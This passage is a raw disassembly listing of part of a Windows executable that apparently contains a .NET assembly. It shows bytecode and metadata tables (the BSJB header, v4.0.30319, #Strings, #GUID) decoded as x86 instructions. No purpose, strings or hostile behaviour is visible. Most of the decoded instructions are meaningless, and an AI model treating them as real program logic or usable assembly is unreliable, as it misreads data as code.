  406804:	70 00                	jo     0x406806
  406806:	00 06                	add    %al,(%esi)
  406808:	6f                   	outsl  %ds:(%esi),(%dx)
  406809:	2d 01 00 0a 6f       	sub    $0x6f0a0001,%eax
  40680e:	2f                   	das
  40680f:	01 00                	add    %eax,(%eax)
  406811:	0a 06                	or     (%esi),%al
  406813:	18 6f 30             	sbb    %ch,0x30(%edi)
  406816:	01 00                	add    %eax,(%eax)
  406818:	0a 06                	or     (%esi),%al
  40681a:	6f                   	outsl  %ds:(%esi),(%dx)
  40681b:	4d                   	dec    %ebp
  40681c:	01 00                	add    %eax,(%eax)
  40681e:	0a 13                	or     (%ebx),%dl
  406820:	04 02                	add    $0x2,%al
  406822:	0d 11 04 09 16       	or     $0x16090411,%eax
  406827:	09 8e b7 6f 32 01    	or     %ecx,0x1326fb7(%esi)
  40682d:	00 0a                	add    %cl,(%edx)
  40682f:	0b de                	or     %esi,%ebx
  406831:	11 de                	adc    %ebx,%esi
  406833:	0f 25                	(bad)
  406835:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  40683b:	05 28 27 00 00       	add    $0x2728,%eax
  406840:	0a de                	or     %dh,%bl
  406842:	00 07                	add    %al,(%edi)
  406844:	2a 00                	sub    (%eax),%al
  406846:	00 00                	add    %al,(%eax)
  406848:	01 10                	add    %edx,(%eax)
  40684a:	00 00                	add    %al,(%eax)
  40684c:	00 00                	add    %al,(%eax)
  40684e:	0c 00                	or     $0x0,%al
  406850:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  406854:	29 00                	sub    %eax,(%eax)
  406856:	00 01                	add    %al,(%ecx)
  406858:	1b 30                	sbb    (%eax),%esi
  40685a:	04 00                	add    $0x0,%al
  40685c:	55                   	push   %ebp
  40685d:	00 00                	add    %al,(%eax)
  40685f:	00 49 00             	add    %cl,0x0(%ecx)
  406862:	00 11                	add    %dl,(%ecx)
  406864:	73 2b                	jae    0x406891
  406866:	01 00                	add    %eax,(%eax)
  406868:	0a 0a                	or     (%edx),%cl
  40686a:	73 2c                	jae    0x406898
  40686c:	01 00                	add    %eax,(%eax)
  40686e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  406871:	08 7e 09             	or     %bh,0x9(%esi)
  406874:	00 00                	add    %al,(%eax)
  406876:	04 28                	add    $0x28,%al
  406878:	70 00                	jo     0x40687a
  40687a:	00 06                	add    %al,(%esi)
  40687c:	6f                   	outsl  %ds:(%esi),(%dx)
  40687d:	2d 01 00 0a 6f       	sub    $0x6f0a0001,%eax
  406882:	2f                   	das
  406883:	01 00                	add    %eax,(%eax)
  406885:	0a 06                	or     (%esi),%al
  406887:	18 6f 30             	sbb    %ch,0x30(%edi)
  40688a:	01 00                	add    %eax,(%eax)
  40688c:	0a 06                	or     (%esi),%al
  40688e:	6f                   	outsl  %ds:(%esi),(%dx)
  40688f:	31 01                	xor    %eax,(%ecx)
  406891:	00 0a                	add    %cl,(%edx)
  406893:	13 04 02             	adc    (%edx,%eax,1),%eax
  406896:	0d 11 04 09 16       	or     $0x16090411,%eax
  40689b:	09 8e b7 6f 32 01    	or     %ecx,0x1326fb7(%esi)
  4068a1:	00 0a                	add    %cl,(%edx)
  4068a3:	0b de                	or     %esi,%ebx
  4068a5:	11 de                	adc    %ebx,%esi
  4068a7:	0f 25                	(bad)
  4068a9:	28 25 00 00 0a 13    	sub    %ah,0x130a0000
  4068af:	05 28 27 00 00       	add    $0x2728,%eax
  4068b4:	0a de                	or     %dh,%bl
  4068b6:	00 07                	add    %al,(%edi)
  4068b8:	2a 00                	sub    (%eax),%al
  4068ba:	00 00                	add    %al,(%eax)
  4068bc:	01 10                	add    %edx,(%eax)
  4068be:	00 00                	add    %al,(%eax)
  4068c0:	00 00                	add    %al,(%eax)
  4068c2:	0c 00                	or     $0x0,%al
  4068c4:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  4068c8:	29 00                	sub    %eax,(%eax)
  4068ca:	00 01                	add    %al,(%ecx)
  4068cc:	13 30                	adc    (%eax),%esi
  4068ce:	03 00                	add    (%eax),%eax
  4068d0:	18 00                	sbb    %al,(%eax)
  4068d2:	00 00                	add    %al,(%eax)
  4068d4:	4a                   	dec    %edx
  4068d5:	00 00                	add    %al,(%eax)
  4068d7:	11 16                	adc    %edx,(%esi)
  4068d9:	7e 10                	jle    0x4068eb
  4068db:	00 00                	add    %al,(%eax)
  4068dd:	04 12                	add    $0x12,%al
  4068df:	00 73 4e             	add    %dh,0x4e(%ebx)
  4068e2:	01 00                	add    %eax,(%eax)
  4068e4:	0a 80 34 00 00 04    	or     0x4000034(%eax),%al
  4068ea:	06                   	push   %es
  4068eb:	0b 2b                	or     (%ebx),%ebp
  4068ed:	00 07                	add    %al,(%edi)
  4068ef:	2a 62 7e             	sub    0x7e(%edx),%ah
  4068f2:	34 00                	xor    $0x0,%al
  4068f4:	00 04 2c             	add    %al,(%esp,%ebp,1)
  4068f7:	10 7e 34             	adc    %bh,0x34(%esi)
  4068fa:	00 00                	add    %al,(%eax)
  4068fc:	04 6f                	add    $0x6f,%al
  4068fe:	4f                   	dec    %edi
  4068ff:	01 00                	add    %eax,(%eax)
  406901:	0a 14 80             	or     (%eax,%eax,4),%dl
  406904:	34 00                	xor    $0x0,%al
  406906:	00 04 2a             	add    %al,(%edx,%ebp,1)
  406909:	00 00                	add    %al,(%eax)
  40690b:	00 42 53             	add    %al,0x53(%edx)
  40690e:	4a                   	dec    %edx
  40690f:	42                   	inc    %edx
  406910:	01 00                	add    %eax,(%eax)
  406912:	01 00                	add    %eax,(%eax)
  406914:	00 00                	add    %al,(%eax)
  406916:	00 00                	add    %al,(%eax)
  406918:	0c 00                	or     $0x0,%al
  40691a:	00 00                	add    %al,(%eax)
  40691c:	76 34                	jbe    0x406952
  40691e:	2e 30 2e             	xor    %ch,%cs:(%esi)
  406921:	33 30                	xor    (%eax),%esi
  406923:	33 31                	xor    (%ecx),%esi
  406925:	39 00                	cmp    %eax,(%eax)
  406927:	00 00                	add    %al,(%eax)
  406929:	00 05 00 6c 00 00    	add    %al,0x6c00
  40692f:	00 8c 1d 00 00 23 7e 	add    %cl,0x7e230000(%ebp,%ebx,1)
  406936:	00 00                	add    %al,(%eax)
  406938:	f8                   	clc
  406939:	1d 00 00 3c 21       	sbb    $0x213c0000,%eax
  40693e:	00 00                	add    %al,(%eax)
  406940:	23 53 74             	and    0x74(%ebx),%edx
  406943:	72 69                	jb     0x4069ae
  406945:	6e                   	outsb  %ds:(%esi),(%dx)
  406946:	67 73 00             	addr16 jae 0x406949
  406949:	00 00                	add    %al,(%eax)
  40694b:	00 34 3f             	add    %dh,(%edi,%edi,1)
  40694e:	00 00                	add    %al,(%eax)
  406950:	ac                   	lods   %ds:(%esi),%al
  406951:	15 00 00 23 55       	adc    $0x55230000,%eax
  406956:	53                   	push   %ebx
  406957:	00 e0                	add    %ah,%al
  406959:	54                   	push   %esp
  40695a:	00 00                	add    %al,(%eax)
  40695c:	10 00                	adc    %al,(%eax)
  40695e:	00 00                	add    %al,(%eax)
  406960:	23 47 55             	and    0x55(%edi),%eax
  406963:	49                   	dec    %ecx
  406964:	44                   	inc    %esp
  406965:	00 00                	add    %al,(%eax)
  406967:	00 f0                	add    %dh,%al
  406969:	54                   	push   %esp
  40696a:	00 00                	add    %al,(%eax)
  40696c:	ac                   	lods   %ds:(%esi),%al
  40696d:	0b 00                	or     (%eax),%eax
  40696f:	00 23                	add    %ah,(%ebx)
  406971:	42                   	inc    %edx
  406972:	6c                   	insb   (%dx),%es:(%edi)
  406973:	6f                   	outsl  %ds:(%esi),(%dx)
  406974:	62 00                	bound  %eax,(%eax)
  406976:	00 00                	add    %al,(%eax)
  406978:	00 00                	add    %al,(%eax)
  40697a:	00 00                	add    %al,(%eax)
  40697c:	02 00                	add    (%eax),%al
  40697e:	00 01                	add    %al,(%ecx)
  406980:	57                   	push   %edi
  406981:	3d a2 1d 09 0e       	cmp    $0xe091da2,%eax
  406986:	00 00                	add    %al,(%eax)
  406988:	00 fa                	add    %bh,%dl
  40698a:	25 33 00 16 00       	and    $0x160033,%eax
  40698f:	00 01                	add    %al,(%ecx)
  406991:	00 00                	add    %al,(%eax)
  406993:	00 b3 00 00 00 15    	add    %dh,0x15000000(%ebx)
  406999:	00 00                	add    %al,(%eax)
  40699b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40699e:	00 00                	add    %al,(%eax)
  4069a0:	85 00                	test   %eax,(%eax)
  4069a2:	00 00                	add    %al,(%eax)
  4069a4:	70 00                	jo     0x4069a6
  4069a6:	00 00                	add    %al,(%eax)
  4069a8:	5a                   	pop    %edx
  4069a9:	01 00                	add    %eax,(%eax)
  4069ab:	00 05 00 00 00 42    	add    %al,0x42000000
  4069b1:	00 00                	add    %al,(%eax)
  4069b3:	00 08                	add    %cl,(%eax)
  4069b5:	00 00                	add    %al,(%eax)
  4069b7:	00 4a 00             	add    %cl,0x0(%edx)
  4069ba:	00 00                	add    %al,(%eax)
  4069bc:	02 00                	add    (%eax),%al
  4069be:	00 00                	add    %al,(%eax)
  4069c0:	05 00 00 00 05       	add    $0x5000000,%eax
  4069c5:	00 00                	add    %al,(%eax)
  4069c7:	00 05 00 00 00 0b    	add    %al,0xb000000
  4069cd:	00 00                	add    %al,(%eax)
  4069cf:	00 15 00 00 00 01    	add    %dl,0x1000000
  4069d5:	00 00                	add    %al,(%eax)
  4069d7:	00 07                	add    %al,(%edi)
  4069d9:	00 00                	add    %al,(%eax)
  4069db:	00 06                	add    %al,(%esi)
  4069dd:	00 00                	add    %al,(%eax)
  4069df:	00 03                	add    %al,(%ebx)
  4069e1:	00 00                	add    %al,(%eax)
  4069e3:	00 04 00             	add    %al,(%eax,%eax,1)
  4069e6:	00 00                	add    %al,(%eax)
  4069e8:	00 00                	add    %al,(%eax)
  4069ea:	31 21                	xor    %esp,(%ecx)
  4069ec:	01 00                	add    %eax,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	00 00                	add    %al,(%eax)
  4069f2:	0a 00                	or     (%eax),%al
  4069f4:	3a 01                	cmp    (%ecx),%al
  4069f6:	10 01                	adc    %al,(%ecx)
  4069f8:	0a 00                	or     (%eax),%al
  4069fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4069fb:	01 50 01             	add    %edx,0x1(%eax)
  4069fe:	06                   	push   %es
  4069ff:	00 7e 01             	add    %bh,0x1(%esi)
  406a02:	77 01                	ja     0x406a05
  406a04:	0a 00                	or     (%eax),%al
  406a06:	d6                   	salc
  406a07:	01 10                	add    %edx,(%eax)
  406a09:	01 06                	add    %eax,(%esi)
  406a0b:	00 54 02 77          	add    %dl,0x77(%edx,%eax,1)
  406a0f:	01 0e                	add    %ecx,(%esi)
  406a11:	00 e7                	add    %ah,%bh
  406a13:	03 d4                	add    %esp,%edx
  406a15:	03 06                	add    (%esi),%eax
  406a17:	00 0e                	add    %cl,(%esi)
  406a19:	04 04                	add    $0x4,%al
  406a1b:	04 06                	add    $0x6,%al
  406a1d:	00 2f                	add    %ch,(%edi)
  406a1f:	04 1e                	add    $0x1e,%al
  406a21:	04 06                	add    $0x6,%al
  406a23:	00 3a                	add    %bh,(%edx)
  406a25:	04 1e                	add    $0x1e,%al
  406a27:	04 06                	add    $0x6,%al
  406a29:	00 c2                	add    %al,%dl
  406a2b:	04 77                	add    $0x77,%al
  406a2d:	01 06                	add    %eax,(%esi)
  406a2f:	00 41 05             	add    %al,0x5(%ecx)
  406a32:	1e                   	push   %ds
  406a33:	04 06                	add    $0x6,%al
  406a35:	00 fe                	add    %bh,%dh
  406a37:	07                   	pop    %es
  406a38:	f2 07                	repnz pop %es
  406a3a:	0e                   	push   %cs
  406a3b:	00 c5                	add    %al,%ch
  406a3d:	08 b5 08 06 00 82    	or     %dh,-0x7dfff9f8(%ebp)
  406a43:	09 04 04             	or     %eax,(%esp,%eax,1)
  406a46:	06                   	push   %es
  406a47:	00 a1 09 77 01 06    	add    %ah,0x6017709(%ecx)
  406a4d:	00 07                	add    %al,(%edi)
  406a4f:	0a 77 01             	or     0x1(%edi),%dh
  406a52:	06                   	push   %es
  406a53:	00 0c 03             	add    %cl,(%ebx,%eax,1)
  406a56:	1e                   	push   %ds
  406a57:	04 06                	add    $0x6,%al
  406a59:	00 14 0b             	add    %dl,(%ebx,%ecx,1)
  406a5c:	77 01                	ja     0x406a5f
  406a5e:	06                   	push   %es
  406a5f:	00 40 0b             	add    %al,0xb(%eax)
  406a62:	77 01                	ja     0x406a65
  406a64:	06                   	push   %es
  406a65:	00 a3 0b 77 01 06    	add    %ah,0x601770b(%ebx)
  406a6b:	00 bb 0b 77 01 0e    	add    %bh,0xe01770b(%ebx)
  406a71:	00 13                	add    %dl,(%ebx)
  406a73:	0c fd                	or     $0xfd,%al
  406a75:	0b 0e                	or     (%esi),%ecx
  406a77:	00 2c 0c             	add    %ch,(%esp,%ecx,1)
  406a7a:	fd                   	std
  406a7b:	0b 0e                	or     (%esi),%ecx
  406a7d:	00 59 0c             	add    %bl,0xc(%ecx)
  406a80:	41                   	inc    %ecx
  406a81:	0c 06                	or     $0x6,%al
  406a83:	00 83 0c 70 0c 0a    	add    %al,0xa0c700c(%ebx)
  406a89:	00 c2                	add    %al,%dl
  406a8b:	0c 9b                	or     $0x9b,%al
  406a8d:	0c 0a                	or     $0xa,%al
  406a8f:	00 da                	add    %bl,%dl
  406a91:	0c 13                	or     $0x13,%al
  406a93:	00 0e                	add    %cl,(%esi)
  406a95:	00 0f                	add    %cl,(%edi)
  406a97:	0d f2 0c 06 00       	or     $0x60cf2,%eax
  406a9c:	44                   	inc    %esp
  406a9d:	0d 24 0d 06 00       	or     $0x60d24,%eax
  406aa2:	62 0d 77 01 06 00    	bound  %ecx,0x60177
  406aa8:	86 0d 77 01 0a 00    	xchg   %cl,0xa0177
  406aae:	9f                   	lahf
  406aaf:	0d 13 00 06 00       	or     $0x60013,%eax
  406ab4:	d9 0d ba 0d 06 00    	(bad) 0x60dba
  406aba:	ed                   	in     (%dx),%eax
  406abb:	0d 77 01 06 00       	or     $0x60177,%eax
  406ac0:	03 0e                	add    (%esi),%ecx
  406ac2:	24 0d                	and    $0xd,%al
  406ac4:	0a 00                	or     (%eax),%al
  406ac6:	1e                   	push   %ds
  406ac7:	0e                   	push   %cs
  406ac8:	9b                   	fwait
  406ac9:	0c 0a                	or     $0xa,%al
  406acb:	00 34 0e             	add    %dh,(%esi,%ecx,1)
  406ace:	13 00                	adc    (%eax),%eax
  406ad0:	06                   	push   %es
  406ad1:	00 48 0e             	add    %cl,0xe(%eax)
  406ad4:	77 01                	ja     0x406ad7
  406ad6:	06                   	push   %es
  406ad7:	00 91 0e 70 0c 06    	add    %dl,0x60c700e(%ecx)
  406add:	00 aa 0e 70 0c 06    	add    %ch,0x60c700e(%edx)
  406ae3:	00 c7                	add    %al,%bh
  406ae5:	0e                   	push   %cs
  406ae6:	77 01                	ja     0x406ae9
  406ae8:	06                   	push   %es
  406ae9:	00 d1                	add    %dl,%cl
  406aeb:	0e                   	push   %cs
  406aec:	04 04                	add    $0x4,%al
  406aee:	0e                   	push   %cs
  406aef:	00 da                	add    %bl,%dl
  406af1:	0e                   	push   %cs
  406af2:	70 0c                	jo     0x406b00
  406af4:	0e                   	push   %cs
  406af5:	00 e2                	add    %ah,%dl
  406af7:	0e                   	push   %cs
  406af8:	70 0c                	jo     0x406b06
  406afa:	06                   	push   %es
  406afb:	00 f3                	add    %dh,%bl
  406afd:	0e                   	push   %cs
  406afe:	77 01                	ja     0x406b01
  406b00:	0a 00                	or     (%eax),%al
  406b02:	1a 0f                	sbb    (%edi),%cl
  406b04:	9b                   	fwait
  406b05:	0c 06                	or     $0x6,%al
  406b07:	00 4d 0f             	add    %cl,0xf(%ebp)
  406b0a:	04 04                	add    $0x4,%al
  406b0c:	06                   	push   %es
  406b0d:	00 76 0f             	add    %dh,0xf(%esi)
  406b10:	04 04                	add    $0x4,%al
  406b12:	06                   	push   %es
  406b13:	00 97 0f 04 04 0e    	add    %dl,0xe04040f(%edi)
  406b19:	00 be 0f 70 0c 06    	add    %bh,0x60c700f(%esi)
  406b1f:	00 eb                	add    %ch,%bl
  406b21:	0f 04                	(bad)
  406b23:	04 0a                	add    $0xa,%al
  406b25:	00 2c 10             	add    %ch,(%eax,%edx,1)
  406b28:	50                   	push   %eax
  406b29:	01 0a                	add    %ecx,(%edx)
  406b2b:	00 5c 10 3b          	add    %bl,0x3b(%eax,%edx,1)
  406b2f:	10 06                	adc    %al,(%esi)
  406b31:	00 77 10             	add    %dh,0x10(%edi)
  406b34:	b5 08                	mov    $0x8,%ch
  406b36:	b7 00                	mov    $0x0,%bh
  406b38:	9e                   	sahf
  406b39:	10 00                	adc    %al,(%eax)
  406b3b:	00 06                	add    %al,(%esi)
  406b3d:	00 c7                	add    %al,%bh
  406b3f:	10 77 01             	adc    %dh,0x1(%edi)
  406b42:	0a 00                	or     (%eax),%al
  406b44:	cf                   	iret
  406b45:	10 9b 0c 06 00 09    	adc    %bl,0x900060c(%ebx)
  406b4b:	11 04 04             	adc    %eax,(%esp,%eax,1)
  406b4e:	06                   	push   %es
  406b4f:	00 12                	add    %dl,(%edx)
  406b51:	11 1e                	adc    %ebx,(%esi)
  406b53:	04 0e                	add    $0xe,%al
  406b55:	00 42 11             	add    %al,0x11(%edx)
  406b58:	70 0c                	jo     0x406b66
  406b5a:	0e                   	push   %cs
  406b5b:	00 8e 11 83 11 0a    	add    %cl,0xa118311(%esi)
  406b61:	00 b0 11 50 01 06    	add    %dh,0x6015011(%eax)
  406b67:	00 e7                	add    %ah,%bh
  406b69:	11 d4                	adc    %edx,%esp
  406b6b:	11 12                	adc    %edx,(%edx)
  406b6d:	00 05 12 f3 11 06    	add    %al,0x611f312
  406b73:	00 1e                	add    %bl,(%esi)
  406b75:	12 d4                	adc    %ah,%dl
  406b77:	11 0a                	adc    %ecx,(%edx)
  406b79:	00 51 12             	add    %dl,0x12(%ecx)
  406b7c:	9b                   	fwait
  406b7d:	0c 06                	or     $0x6,%al
  406b7f:	00 83 12 77 01 06    	add    %al,0x6017712(%ebx)
  406b85:	00 a2 12 77 01 06    	add    %ah,0x6017712(%edx)
  406b8b:	00 b6 12 1e 04 06    	add    %dh,0x6041e12(%esi)
  406b91:	00 c9                	add    %cl,%cl
  406b93:	12 77 01             	adc    0x1(%edi),%dh
  406b96:	06                   	push   %es
  406b97:	00 dc                	add    %bl,%ah
  406b99:	12 ba 0d 0e 00 17    	adc    0x17000e0d(%edx),%bh
  406b9f:	13 83 11 06 00 21    	adc    0x21000611(%ebx),%eax
  406ba5:	13 77 01             	adc    0x1(%edi),%esi
  406ba8:	0e                   	push   %cs
  406ba9:	00 2c 13             	add    %ch,(%ebx,%edx,1)
  406bac:	83 11 06             	adcl   $0x6,(%ecx)
  406baf:	00 41 13             	add    %al,0x13(%ecx)
  406bb2:	1e                   	push   %ds
  406bb3:	04 0e                	add    $0xe,%al
  406bb5:	00 4f 13             	add    %cl,0x13(%edi)
  406bb8:	d4 03                	aam    $0x3
  406bba:	0e                   	push   %cs
  406bbb:	00 5d 13             	add    %bl,0x13(%ebp)
  406bbe:	d4 03                	aam    $0x3
  406bc0:	0e                   	push   %cs
  406bc1:	00 68 13             	add    %ch,0x13(%eax)
  406bc4:	d4 03                	aam    $0x3
  406bc6:	06                   	push   %es
  406bc7:	00 75 13             	add    %dh,0x13(%ebp)
  406bca:	77 01                	ja     0x406bcd
  406bcc:	0e                   	push   %cs
  406bcd:	00 ab 13 d4 03 06    	add    %ch,0x603d413(%ebx)
  406bd3:	00 b7 13 1e 04 06    	add    %dh,0x6041e13(%edi)
  406bd9:	00 e0                	add    %ah,%al
  406bdb:	13 77 01             	adc    0x1(%edi),%esi
  406bde:	06                   	push   %es
  406bdf:	00 29                	add    %ch,(%ecx)
  406be1:	14 77                	adc    $0x77,%al
  406be3:	01 06                	add    %eax,(%esi)
  406be5:	00 32                	add    %dh,(%edx)
  406be7:	14 04                	adc    $0x4,%al
  406be9:	04 06                	add    $0x6,%al
  406beb:	00 6d 14             	add    %ch,0x14(%ebp)
  406bee:	53                   	push   %ebx
  406bef:	14 06                	adc    $0x6,%al
  406bf1:	00 88 14 53 14 06    	add    %cl,0x6145314(%eax)
  406bf7:	00 99 14 53 14 12    	add    %bl,0x12145314(%ecx)
  406bfd:	00 b5 14 f3 11 12    	add    %dh,0x1211f314(%ebp)
  406c03:	00 ca                	add    %cl,%dl
  406c05:	14 f3                	adc    $0xf3,%al
  406c07:	11 67 01             	adc    %esp,0x1(%edi)
  406c0a:	e5 14                	in     $0x14,%eax
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	12 00                	adc    (%eax),%al
  406c10:	39 15 f3 11 12 00    	cmp    %edx,0x1211f3
  406c16:	45                   	inc    %ebp
  406c17:	15 f3 11 06 00       	adc    $0x611f3,%eax
  406c1c:	8f                   	(bad)
  406c1d:	15 77 01 0a 00       	adc    $0xa0177,%eax
  406c22:	96                   	xchg   %eax,%esi
  406c23:	15 13 00 06 00       	adc    $0x60013,%eax
  406c28:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406c29:	15 77 01 06 00       	adc    $0x60177,%eax
  406c2e:	b0 15                	mov    $0x15,%al
  406c30:	77 01                	ja     0x406c33
  406c32:	06                   	push   %es
  406c33:	00 d8                	add    %bl,%al
  406c35:	15 04 04 06 00       	adc    $0x60404,%eax
  406c3a:	ef                   	out    %eax,(%dx)
  406c3b:	15 1e 04 0a 00       	adc    $0xa041e,%eax
  406c40:	08 16                	or     %dl,(%esi)
  406c42:	9b                   	fwait
  406c43:	0c 06                	or     $0x6,%al
  406c45:	00 36                	add    %dh,(%esi)
  406c47:	16                   	push   %ss
  406c48:	1e                   	push   %ds
  406c49:	04 0e                	add    $0xe,%al
  406c4b:	00 44 16 d4          	add    %al,-0x2c(%esi,%edx,1)
  406c4f:	03 06                	add    (%esi),%eax
  406c51:	00 64 16 77          	add    %ah,0x77(%esi,%edx,1)
  406c55:	01 16                	add    %edx,(%esi)
  406c57:	00 cd                	add    %cl,%ch
  406c59:	16                   	push   %ss
  406c5a:	be 16 16 00 d6       	mov    $0xd6001616,%esi
  406c5f:	16                   	push   %ss
  406c60:	be 16 16 00 db       	mov    $0xdb001616,%esi
  406c65:	16                   	push   %ss
  406c66:	be 16 16 00 e5       	mov    $0xe5001616,%esi
  406c6b:	16                   	push   %ss
  406c6c:	be 16 0a 00 ec       	mov    $0xec000a16,%esi
  406c71:	16                   	push   %ss
  406c72:	13 00                	adc    (%eax),%eax
  406c74:	0a 00                	or     (%eax),%al
  406c76:	f4                   	hlt
  406c77:	16                   	push   %ss
  406c78:	13 00                	adc    (%eax),%eax
  406c7a:	1a 00                	sbb    (%eax),%al
  406c7c:	27                   	daa
  406c7d:	02 02                	add    (%edx),%al
  406c7f:	17                   	pop    %ss
  406c80:	0e                   	push   %cs
  406c81:	00 1f                	add    %bl,(%edi)
  406c83:	17                   	pop    %ss
  406c84:	d4 03                	aam    $0x3
  406c86:	06                   	push   %es
  406c87:	00 37                	add    %dh,(%edi)
  406c89:	17                   	pop    %ss
  406c8a:	77 01                	ja     0x406c8d
  406c8c:	0e                   	push   %cs
  406c8d:	00 50 17             	add    %dl,0x17(%eax)
  406c90:	83 11 0e             	adcl   $0xe,(%ecx)
  406c93:	00 7a 17             	add    %bh,0x17(%edx)
  406c96:	83 11 0a             	adcl   $0xa,(%ecx)
  406c99:	00 e0                	add    %ah,%al
  406c9b:	17                   	pop    %ss
  406c9c:	13 00                	adc    (%eax),%eax
  406c9e:	1a 00                	sbb    (%eax),%al
  406ca0:	2a 18                	sub    (%eax),%bl
  406ca2:	02 17                	add    (%edi),%dl
  406ca4:	16                   	push   %ss
  406ca5:	00 7a 18             	add    %bh,0x18(%edx)
  406ca8:	63 18                	arpl   %ebx,(%eax)
  406caa:	16                   	push   %ss
  406cab:	00 86 18 be 16 16    	add    %al,0x1616be18(%esi)
  406cb1:	00 96 18 be 16 16    	add    %dl,0x1616be18(%esi)
  406cb7:	00 b8 18 be 16 16    	add    %bh,0x1616be18(%eax)
  406cbd:	00 cf                	add    %cl,%bh
  406cbf:	18 63 18             	sbb    %ah,0x18(%ebx)
  406cc2:	06                   	push   %es
  406cc3:	00 0a                	add    %cl,(%edx)
  406cc5:	19 f8                	sbb    %edi,%eax
  406cc7:	18 06                	sbb    %al,(%esi)
  406cc9:	00 15 19 77 01 06    	add    %dl,0x6017719
  406ccf:	00 31                	add    %dh,(%ecx)
  406cd1:	19 f8                	sbb    %edi,%eax
  406cd3:	18 06                	sbb    %al,(%esi)
  406cd5:	00 48 19             	add    %cl,0x19(%eax)
  406cd8:	f8                   	clc
  406cd9:	18 06                	sbb    %al,(%esi)
  406cdb:	00 85 19 77 01 0e    	add    %al,0xe017719(%ebp)
  406ce1:	00 96 19 70 0c 06    	add    %dl,0x60c7019(%esi)
  406ce7:	00 e2                	add    %ah,%dl
  406ce9:	19 c7                	sbb    %eax,%edi
  406ceb:	19 06                	sbb    %eax,(%esi)
  406ced:	00 1c 1a             	add    %bl,(%edx,%ebx,1)
  406cf0:	77 01                	ja     0x406cf3
  406cf2:	1e                   	push   %ds
  406cf3:	00 3b                	add    %bh,(%ebx)
  406cf5:	1a 2f                	sbb    (%edi),%ch
  406cf7:	1a 06                	sbb    (%esi),%al
  406cf9:	00 46 1a             	add    %al,0x1a(%esi)
  406cfc:	c7                   	(bad)
  406cfd:	19 0e                	sbb    %ecx,(%esi)
  406cff:	00 58 1a             	add    %bl,0x1a(%eax)
  406d02:	83 11 0e             	adcl   $0xe,(%ecx)
  406d05:	00 67 1a             	add    %ah,0x1a(%edi)
  406d08:	83 11 0e             	adcl   $0xe,(%ecx)
  406d0b:	00 77 1a             	add    %dh,0x1a(%edi)
  406d0e:	83 11 0e             	adcl   $0xe,(%ecx)
  406d11:	00 c4                	add    %al,%ah
  406d13:	1a 83 11 06 00 fa    	sbb    -0x5fff9ef(%ebx),%al
  406d19:	1a f8                	sbb    %al,%bh
  406d1b:	18 06                	sbb    %al,(%esi)
  406d1d:	00 05 1b f8 18 06    	add    %al,0x618f81b
  406d23:	00 21                	add    %ah,(%ecx)
  406d25:	1b f2                	sbb    %edx,%esi
  406d27:	07                   	pop    %es
  406d28:	06                   	push   %es
  406d29:	00 49 1b             	add    %cl,0x1b(%ecx)
  406d2c:	ba 0d 06 00 5c       	mov    $0x5c00060d,%edx
  406d31:	1b ba 0d 06 00 6a    	sbb    0x6a00060d(%edx),%edi
  406d37:	1b 04 04             	sbb    (%esp,%eax,1),%eax
  406d3a:	06                   	push   %es
  406d3b:	00 74 1b 04          	add    %dh,0x4(%ebx,%ebx,1)
  406d3f:	04 06                	add    $0x6,%al
  406d41:	00 81 1b b5 08 06    	add    %al,0x608b51b(%ecx)
  406d47:	00 cb                	add    %cl,%bl
  406d49:	1b 04 04             	sbb    (%esp,%eax,1),%eax
  406d4c:	06                   	push   %es
  406d4d:	00 fc                	add    %bh,%ah
  406d4f:	1b 04 04             	sbb    (%esp,%eax,1),%eax
  406d52:	06                   	push   %es
  406d53:	00 58 1c             	add    %bl,0x1c(%eax)
  406d56:	04 04                	add    $0x4,%al
  406d58:	0a 00                	or     (%eax),%al
  406d5a:	82 1c 13 00          	sbbb   $0x0,(%ebx,%edx,1)
  406d5e:	06                   	push   %es
  406d5f:	00 8e 1c 77 01 06    	add    %cl,0x601771c(%esi)
  406d65:	00 11                	add    %dl,(%ecx)
  406d67:	1d ba 0d 1a 00       	sbb    $0x1a0dba,%eax
  406d6c:	2e 1d 02 17 06 00    	cs sbb $0x61702,%eax
  406d72:	3f                   	aas
  406d73:	1d 77 01 06 00       	sbb    $0x60177,%eax
  406d78:	73 1d                	jae    0x406d97
  406d7a:	ba 0d 0e 00 80       	mov    $0x80000e0d,%edx
  406d7f:	1d b5 08 0e 00       	sbb    $0xe08b5,%eax
  406d84:	9a 1d b5 08 06 00 07 	lcall  $0x700,$0x608b51d
  406d8b:	1e                   	push   %ds
  406d8c:	ea 1d 06 00 17 1e ea 	ljmp   $0xea1e,$0x1700061d
  406d93:	1d 06 00 28 1e       	sbb    $0x1e280006,%eax
  406d98:	ea 1d 06 00 41 1e ea 	ljmp   $0xea1e,$0x4100061d
  406d9f:	1d 06 00 60 1e       	sbb    $0x1e600006,%eax
  406da4:	ea 1d 06 00 7b 1e ea 	ljmp   $0xea1e,$0x7b00061d
  406dab:	1d 0e 00 c0 1e       	sbb    $0x1ec0000e,%eax
  406db0:	77 01                	ja     0x406db3
  406db2:	0e                   	push   %cs
  406db3:	00 c4                	add    %al,%ah
  406db5:	1e                   	push   %ds
  406db6:	77 01                	ja     0x406db9
  406db8:	06                   	push   %es
  406db9:	00 4c 1f 77          	add    %cl,0x77(%edi,%ebx,1)
  406dbd:	01 06                	add    %eax,(%esi)
  406dbf:	00 64 1f b5          	add    %ah,-0x4b(%edi,%ebx,1)
  406dc3:	08 06                	or     %al,(%esi)
  406dc5:	00 8c 1f b5 08 06 00 	add    %cl,0x608b5(%edi,%ebx,1)
  406dcc:	9e                   	sahf
  406dcd:	1f                   	pop    %ds
  406dce:	77 01                	ja     0x406dd1
  406dd0:	0e                   	push   %cs
  406dd1:	00 c1                	add    %al,%cl
  406dd3:	1f                   	pop    %ds
  406dd4:	ab                   	stos   %eax,%es:(%edi)
  406dd5:	1f                   	pop    %ds
  406dd6:	0e                   	push   %cs
  406dd7:	00 cc                	add    %cl,%ah
  406dd9:	1f                   	pop    %ds
  406dda:	ab                   	stos   %eax,%es:(%edi)
  406ddb:	1f                   	pop    %ds
  406ddc:	06                   	push   %es
  406ddd:	00 06                	add    %al,(%esi)
